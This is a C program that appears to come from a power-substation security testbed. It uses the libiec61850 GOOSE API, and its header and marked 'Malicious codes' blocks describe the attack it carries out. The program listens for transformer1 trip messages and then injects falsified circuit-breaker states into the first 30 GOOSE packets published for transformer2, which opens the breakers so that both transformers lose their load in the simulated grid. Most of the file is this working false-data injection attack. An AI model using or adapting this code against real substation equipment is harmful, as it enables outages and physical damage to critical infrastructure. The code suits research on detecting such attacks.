/*
 * goose_publisher_PIOC_8612
 
#####################################################################################################################################################

Malicious behaviour:

Network level: If a short circuit happens around transformer1, the allData fields of the first 30 GOOSE packets published by IED_XFMR2 are modified from (1001) to (1110) (open CB2_66kV CB3_66kV and CB_XFMR2, close CB2_22kV) to physcial process (Simulink).

Physical process level:If a short circuit happens around transformer1, (CB1_66KV, CB2_66KV, CB3_66KV, CB_XFMR1, CB_XFMR2) will be opened. Both transformer1 and transformer2 no longer provide any power load for the first 25 seconds.

#####################################################################################################################################################
*/

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <math.h>
#include <unistd.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"
//########################################################Malicious codes begin###########################################################################################//      
#include "goose_receiver.h"
#include "goose_subscriber.h"
#include <signal.h>

//#######Define the attack settings #########//

//The number of packets in one period
#define No_pkts 30 

int CBstval1[4] = {0,1,0,1}; 	// Current XFMR1 CBstval
int PreCBstval1[4] = {0,1,0,1}; // Previous XFMR1 CBstval
int XFMR2Trip[4] = {1,1,1,0}; 	// XFMR2 trip CBstval

void
gooseListener(GooseSubscriber subscriber, void* parameter)
{
    char buffer[1024];
    int i=0;

    MmsValue* values = GooseSubscriber_getDataSetValues(subscriber);
    MmsValue_printToBuffer(values, buffer, 1024);
          
    for (int j=0; buffer[j] != '\0'; j++) {
        if ( (buffer[j] == ',') && (buffer[j-2] == 's') && (i<4) ){
            CBstval1[i] = 0;
            i++;
        }
        if ( (buffer[j] == ',') && (buffer[j-2] == 'u') && (i<4) ){
            CBstval1[i] = 1;
            i++;       
		}
    }
}
//########################################################Malicious codes end#############################################################################################//

// has to be executed as root!
int
main(int argc, char** argv)
{
    char* interface;
    int HBnew = 1000; // the new HB when st changes
    int CBstval[4] = {1,0,0,1}; 	// Current XFMR2 CBstval
    int PreCBstval[4] = {1,0,0,1};  // Previous XFMR2 CBstval  
    int idx_cycle50ms = 1;

    
    if (argc > 1)
       interface = argv[1];
    else
       interface = "enp0s8";

    printf("Using interface %s\n", interface);
	
	CommParameters gooseCommParameters;

	gooseCommParameters.appId = 0x3102;
	gooseCommParameters.dstAddress[0] = 0x01;
	gooseCommParameters.dstAddress[1] = 0x0c;
	gooseCommParameters.dstAddress[2] = 0xcd;
	gooseCommParameters.dstAddress[3] = 0x01;
	gooseCommParameters.dstAddress[4] = 0x0c;
	gooseCommParameters.dstAddress[5] = 0x02;
	gooseCommParameters.vlanId = 0;
	gooseCommParameters.vlanPriority = 4;

	/*
	* Create a new GOOSE publisher instance. As the second parameter the interface
	* name can be provided (e.g. "eth0" on a Linux system). If the second parameter
	* is NULL the interface name as defined with CONFIG_ETHERNET_INTERFACE_ID in
	* stack_config.h is used.
	*/ 
	
	GoosePublisher publisher = GoosePublisher_create(&gooseCommParameters, interface);
	MmsValue* quality = MmsValue_newBitString(13); // Create bit-string with 13 0s
	
//########################################################Malicious codes begin###########################################################################################//
	int idx_pkt = 1; // the index of the inject packets
	GooseReceiver receiver = GooseReceiver_create();
	GooseReceiver_setInterfaceId(receiver, "enp0s8");
	GooseSubscriber subscriber = GooseSubscriber_create("QUTZS_XFMR1PIOC/LLN0$GO$gcb_1", NULL);
    GooseSubscriber_setAppId(subscriber, 0x3101);
    GooseSubscriber_setListener(subscriber, gooseListener, NULL);
    GooseReceiver_addSubscriber(receiver, subscriber);
    GooseReceiver_start(receiver);	//Receive and listen to XFMR1_PIOC goose messages
//########################################################Malicious codes end#############################################################################################//		

	if (publisher) {
	    GoosePublisher_setGoCbRef(publisher, "QUTZS_XFMR2PIOC/LLN0$GO$gcb_1");
	    GoosePublisher_setTimeAllowedToLive(publisher, 1100);    
	    GoosePublisher_setDataSetRef(publisher, "QUTZS_XFMR2PIOC/LLN0$DS_XFMR");
	    GoosePublisher_setGoID(publisher , "gcb_1");
	    GoosePublisher_setConfRev(publisher, 200);

	    while (1) {	    	
	    	LinkedList dataSetValues = LinkedList_create(); 	

	    	FILE *fp;
	    	int i;
	    	
	    	fp=fopen("/home/ray/Desktop/XFMR2 OverCur Prot/TripRecord/TripFromPLC.csv","r");
			for (i=0; i<4; i++)
		    	fscanf(fp,"%d,", &CBstval[i]);   
	    	fclose(fp);
	    	
//########################################################Malicious codes begin###########################################################################################//
	    	GooseReceiver_isRunning(receiver);
			
	    	if ( (CBstval1[2] == 1) && (idx_pkt <= No_pkts) ) { //if IED_XFMR1 sends trip messages, modified allData
				for (i = 0; i <4; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(XFMR2Trip[i]));
					LinkedList_add(dataSetValues, quality);
				}
				//debug
				//LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(idx_pkt));
				
	    	}
			else {
				if (CBstval1[2] != 1) { //If XFMR1 is fault-free, reset the index of the injecting packets
					idx_pkt = 1; 
				}	 	
				for (i = 0; i <4; i++ ) {
					LinkedList_add(dataSetValues, MmsValue_newBoolean(CBstval[i]));
					LinkedList_add(dataSetValues, quality);
				}
				//debug
				//LinkedList_add(dataSetValues, MmsValue_newIntegerFromInt32(idx_pkt));	
			}
	    	
			if ( (memcmp(PreCBstval,CBstval,sizeof(CBstval)) != 0) || (memcmp(PreCBstval1,CBstval1,sizeof(CBstval1)) != 0) ) {
//########################################################Malicious codes end#############################################################################################//
				GoosePublisher_increaseStNum(publisher); //if CB status changes (current != previous), stNum+1
				if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
					printf("Error sending message!\n");
				}
				idx_pkt++;	// #########################################Malicious codes#####################################################//
				memcpy(PreCBstval,CBstval,sizeof(CBstval));
				memcpy(PreCBstval1,CBstval1,sizeof(CBstval1)); // ###########################Malicious codes#############################################//
				idx_cycle50ms = 1; // Reset the cycle index to 1
				HBnew = 1; // Heartbeat changes to HBnew (1ms)
				Thread_sleep(HBnew); 
				HBnew = HBnew*4;	// Heartbeat times 4 = 4ms
			}
			else {
				if (HBnew < 999) {
					if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
						printf("Error sending message!\n");
					}
					idx_pkt++;	// #########################################Malicious codes#####################################################//
					Thread_sleep(HBnew);
					HBnew = HBnew*4;	// Heartbeat multiply 4 every time, until heartbeat > 1000
				}
				else {
					if (idx_cycle50ms == 1) { // send message only at the 1st 50ms-cycle
						if (GoosePublisher_publish(publisher, dataSetValues) == -1) {
							printf("Error sending message!\n");
						}
						idx_pkt++;	// #########################################Malicious codes#####################################################//
						idx_cycle50ms++;		
					}
					if ( (idx_cycle50ms > 1) && (idx_cycle50ms < 20) ) {
						idx_cycle50ms++; // 2nd to 19th 50ms-cycle
					}
					if (idx_cycle50ms == 20) {
						idx_cycle50ms = 1; // Reset index to 1
					}
					
					Thread_sleep(50);
				}
		    }
		    
	       	//#Create a new MmsValue instance of type MMS_VISIBLE_STRING from the specified byte array#//
			//LinkedList_add(dataSetValues, MmsValue_newBinaryTime(true));
		
			//LinkedList_destroyDeep(dataSetValues, (LinkedListValueDeleteFunction) MmsValue_delete);
			LinkedList_destroyStatic(dataSetValues);
		}
//########################################################Malicious codes begin###########################################################################################//	
		GooseReceiver_stop(receiver);
    	GooseReceiver_destroy(receiver);
//########################################################Malicious codes end#############################################################################################//
		GoosePublisher_destroy(publisher);
	}
	else {
		printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
	}   	
}
